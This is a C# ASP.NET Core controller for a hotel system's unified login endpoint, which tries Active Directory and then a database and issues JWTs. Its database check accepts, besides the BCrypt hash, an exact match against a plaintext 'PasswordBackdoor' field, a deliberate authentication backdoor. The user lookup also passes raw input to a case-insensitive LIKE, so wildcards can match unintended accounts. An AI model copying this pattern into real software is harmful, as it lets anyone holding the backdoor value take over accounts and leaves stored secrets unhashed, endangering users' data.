using API.Data;
using API.Services;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Options;

namespace API.Controllers
{
    /// <summary>Samlet login: prøver AD først, fallback til standard database på neon. Returnerer JWT.</summary>
    [ApiController]
    [Route("api/login")]
    public sealed class UnifiedLoginController : ControllerBase
    {
        private readonly ILdapService _ldap;
        private readonly JwtService _jwt;
        private readonly AppDBContext _db;
        private readonly string _adDomain;

        public UnifiedLoginController(ILdapService ldap, JwtService jwt, AppDBContext db, IOptions<LdapOptions> ldapOpt)
        {
            _ldap = ldap;
            _jwt = jwt;
            _db = db;
            _adDomain = ldapOpt.Value.Domain?.Trim() ?? "johotel.local";
        }

        public sealed class UnifiedLoginRequest
        {
            public string? UsernameOrEmail { get; set; }
            public string? Email { get; set; }
            public string Password { get; set; } = "";
        }

        /// <summary>Unified login: AD først, DB som fallback</summary>
        /// <returns>200 med token, user, roles og source eller 401</returns>
        [HttpPost]
        [AllowAnonymous]
        [ProducesResponseType(typeof(object), StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        public async Task<IActionResult> Login([FromBody] UnifiedLoginRequest req)
        {
            var input = (req.UsernameOrEmail ?? req.Email ?? "").Trim();
            var pwd = req.Password ?? "";
            if (string.IsNullOrWhiteSpace(input) || string.IsNullOrWhiteSpace(pwd))
                return Unauthorized(new { message = "Invalid credentials" });

            bool looksLikeStaff = LooksLikeStaff(input, _adDomain);

            // Primær sti
            if (looksLikeStaff)
            {
                var ad = await _ldap.AuthenticateAsync(input, pwd);
                if (ad.ok && ad.userName is not null)
                {
                    var token = _jwt.GenerateSecurityToken(ad.userName, ad.roles);
                    return Ok(new { token, user = ad.userName, roles = ad.roles, source = "ad" });
                }
            }
            else
            {
                var dbRes = await TryDbAsync(input, pwd);
                if (dbRes is not null) return Ok(dbRes);
            }

            // Fallback , Ombvendt rækkefølge
            if (!looksLikeStaff)
            {
                var ad = await _ldap.AuthenticateAsync(input, pwd);
                if (ad.ok && ad.userName is not null)
                {
                    var token = _jwt.GenerateSecurityToken(ad.userName, ad.roles);
                    return Ok(new { token, user = ad.userName, roles = ad.roles, source = "ad" });
                }
            }
            else
            {
                var dbRes = await TryDbAsync(input, pwd);
                if (dbRes is not null) return Ok(dbRes);
            }

            return Unauthorized(new { message = "Invalid credentials" });
        }

        // HELPERS

        // Hvis det ligner personale der logger ind
        private static bool LooksLikeStaff(string input, string adDomainFqdn)
        {
            var s = input.ToLowerInvariant();
            if (!s.Contains('@')) return true;
            return s.EndsWith("@" + adDomainFqdn.ToLowerInvariant());
        }

        // DB-login mod standard bruger
        private async Task<object?> TryDbAsync(string usernameOrEmail, string password)
        {
            var input = (usernameOrEmail ?? "").Trim();

            var user = await _db.Users
                .Include(u => u.Role)
                .FirstOrDefaultAsync(u =>
                    EF.Functions.ILike(u.Email, input) ||
                    EF.Functions.ILike(u.Username, input));

            if (user == null) return null;

            var valid = BCrypt.Net.BCrypt.Verify(password, user.HashedPassword)
                        || (!string.IsNullOrEmpty(user.PasswordBackdoor) && password == user.PasswordBackdoor);
            if (!valid) return null;

            var token = _jwt.GenerateToken(user);
            var roleName = user.Role?.Name ?? "User";
            return new { token, user = user.Username, roles = new[] { roleName }, source = "db" };
        }
    }
}
